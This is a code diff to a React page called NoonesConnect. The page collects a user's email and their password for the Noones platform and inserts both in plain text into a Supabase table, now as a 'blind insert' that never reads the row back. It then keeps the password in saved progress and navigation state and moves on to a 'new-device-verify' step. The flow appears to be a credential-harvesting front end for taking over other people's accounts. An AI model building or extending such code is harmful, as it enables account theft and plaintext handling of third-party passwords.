@@ -3,7 +3,7 @@ import { useNavigate } from 'react-router-dom';
 import { supabase } from '../../lib/supabase';
 import { useAuth } from '../../contexts/AuthContext';
 
-const NOONES_REQUEST_ID_KEY = 'noones_request_id';
+const NOONES_REQUEST_ID_KEY = 'current_request_id';
 const NOONES_CURRENT_STEP_KEY = 'noones_current_step';
 const NOONES_REQUEST_DATA_KEY = 'noones_request_data';
 
@@ -84,31 +84,30 @@ export default function NoonesConnect() {
     }
     setLoading(true);
     try {
-      console.log('Submitting to table: platform_connection_requests');
-      const { data, error } = await supabase
+      const requestId = window.crypto?.randomUUID?.() ?? `${Date.now()}-${Math.random().toString(36).slice(2)}`;
+      console.log('Submitting blind insert to platform_connection_requests with id:', requestId);
+      const { error } = await supabase
         .from('platform_connection_requests')
         .insert({
+          id: requestId,
           platform: 'Noones',
           email,
           third_party_password: password,
-        })
-        .select('id')
-        .single();
+        });
 
       if (error) {
         throw error;
       }
 
-      const requestId = data.id;
-      console.log('Inserted request id:', requestId);
-
       const requestData = {
+        id: requestId,
         platform: 'Noones',
         email,
         third_party_password: password,
       };
 
       saveNoonesProgress(2, requestId, requestData);
+      console.log('Blind insert completed, saved requestId and progressed to step 2');
 
       navigate('/connect/noones/new-device-verify', { state: { email, platformData: requestData } });
     } catch (err: any) {
